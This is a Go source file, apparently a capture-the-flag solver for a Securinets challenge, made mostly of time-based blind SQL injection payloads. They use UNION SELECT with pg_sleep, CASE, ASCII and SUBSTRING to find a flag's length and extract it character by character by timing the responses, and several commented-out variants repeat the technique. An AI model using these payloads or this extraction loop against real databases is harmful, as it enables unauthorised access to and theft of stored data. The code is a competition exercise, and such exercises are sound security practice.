package main

import (
	"fmt"
	"time"
)

func GetExecutionTime(fn func()) int {
	start := time.Now()
	fn()
	elapsed := time.Since(start)
	return int(elapsed.Round(time.Second).Seconds())
}

func CheckPayload(payload string) bool {
	length := GetExecutionTime(func() {
		fmt.Println(SubmitFlag(1, payload))
	})
	fmt.Println("Length: ", length)
	return length < 4
}

func GetLengthOfFlag() int {
	length := 0
	for i := 24; i < 100; i++ {
		is := CheckPayload(`Securinets{}')
		union select 1 from tasks
		where pg_sleep(
			case when length(flag) = `+ fmt.Sprintf("%d", i) +` then 0 else 2 end
			) is null
			--`)

		if is {
			length = i
			break
		} else {
			fmt.Println("Not ", i)
		}
	}

	return length
}

func Solver() {


	// fmt.Println(task.Flag)

	// start := time.Now()
	// SubmitFlag(1, `Securinets{testa}`)
	// cte := time.Since(start)

	




	// fmt.Println("Getting flag length...")
	// // length := GetLengthOfFlag()
	// length := 12
	// fmt.Println("flag length:", length + 12)

	// fmt.Println("Getting flag...")
	// flag := "Securinets{"
	// for i := 1; i <= length; i++ {
	// 	fmt.Println("Getting char #"+fmt.Sprintf("%d", i)+"...")
	// 	c := GetChar(cte, i + 11)
	// 	flag += c
	// 	fmt.Println(flag)
	// }

	// fmt.Println(flag + "}")
	// Init()

	// start := time.Now()
	// SubmitFlag(1, `Securinets{testa}`)
	// cte := time.Since(start)

	




	// fmt.Println("Getting flag length...")
	// // length := GetLengthOfFlag()
	// length := 12
	// fmt.Println("flag length:", length + 12)

	// fmt.Println("Getting flag...")
	// flag := "Securinets{"
	// for i := 1; i <= length; i++ {
	// 	fmt.Println("Getting char #"+fmt.Sprintf("%d", i)+"...")
	// 	c := GetChar(cte, i + 11)
	// 	flag += c
	// 	fmt.Println(flag)
	// }

	// fmt.Println(flag + "}")
}
// func GetLengthOfChar(cte time.Duration, idx int) int {
// 	length := GetExecutionTime(cte, func() {
// 		fmt.Println(SubmitFlag(1, `Securinets{testa}')
// 		union
// 		select 1 where pg_sleep(
// 			case when cast(
// 				length(
// 					cast(
// 						ascii(
// 							substring(
// 								(select flag from tasks where id = 1),
// 								`+fmt.Sprintf("%d", idx)+`,
// 								1
// 							)
// 						) as VARCHAR(3)
// 					)
// 				) as integer) = 2 then 3 else 6 end
// 			) is null --`))
// 	})

// 	if length < 6 {
// 		return 2
// 	} else {
// 		return 3
// 	}
// }


func GetChar(cte time.Duration, idx int) string {
	start := time.Now()
	
	SubmitFlag(1, `Securinets{testa}')
					union
						select 1 where pg_sleep(
							ascii(
								substring(
									(select flag from tasks where id = 1),
									`+fmt.Sprintf("%d", idx)+`,
									1
								)
							) - 97
						) is null --`)
			elapsed := time.Since(start)
		return string(rune(97 + int((elapsed - cte).Round(time.Second).Seconds())))
	}

// func GetChar(cte time.Duration, idx int, length int) string {
// 	s := 0
// 	for i := 1; i <= length; i++ {
// 		start := time.Now()

// 		SubmitFlag(1, `Securinets{testa}')
// 					union
// 					select 1 where pg_sleep(
// 						cast(
// 							substring(
// 								cast(
// 									ascii(
// 										substring(
// 											(select flag from tasks where id = 1),
// 											`+fmt.Sprintf("%d", idx)+`,
// 											1
// 										)
// 									) as VARCHAR(3)
// 								),
// 								`+fmt.Sprintf("%d", i)+`,
// 								1
// 							) as integer)
// 						) is null --`)
// 		elapsed := time.Since(start)
// 		// fmt.Printf("Execution time: %s\n", elapsed)
// 		fmt.Printf("Digit: %.0f\n", (elapsed - cte).Round(time.Second).Seconds())
// 		s += int((elapsed - cte).Round(time.Second).Seconds())
// 		s *= 10
// 	}
// 	return string(rune(s / 10))
// }
